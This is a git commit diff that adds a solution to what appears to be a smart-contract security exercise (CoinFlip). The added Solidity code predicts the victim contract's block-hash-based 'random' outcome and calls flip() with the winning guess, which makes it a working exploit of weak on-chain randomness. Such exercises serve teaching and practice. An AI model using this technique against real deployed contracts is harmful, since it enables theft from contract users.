31fbe5da42424404ce7720f1c37376dc710d5875
maks-p <mpazuniak@gmail.com>
2022-07-20 19:00:17 -0400

    CoinFlip solution

--- contracts/1. CoinFlip/AttackingCoinFlip.sol
+++ contracts/1. CoinFlip/AttackingCoinFlip.sol
@@ -2,14 +2,35 @@
 pragma solidity ^0.8.9;
 import "./CoinFlip.sol";
 
+import "hardhat/console.sol";
+
+error AttackingCoinFlip__Call_Unsuccessful();
+
 contract AttackingCoinFlip {
     address public contractAddress;
+
+    // Copy FACTOR from CoinFlip contract
+    uint256 private constant FACTOR =
+        57896044618658097711785492504343953926634992332820282019728792003956564819968;
 
     constructor(address _contractAddress) {
         contractAddress = _contractAddress;
     }
-
+    
     function hackContract() external {
-        // Code me!
+        
+        // Use same logic from CoinFlip contract to identify the proper boolean value
+        uint256 blockValue = uint256(blockhash(block.number - 1));
+        uint256 coinFlip = blockValue / FACTOR;
+        console.log(coinFlip);
+        bool side = coinFlip == 1 ? true : false;
+
+        // Call CoinFlip contract, passing in the proper value
+        (bool success, ) = contractAddress.call(abi.encodeWithSignature("flip(bool)", side));
+        
+        if (!success) {
+            revert AttackingCoinFlip__Call_Unsuccessful();
+        }
+
     }
 }
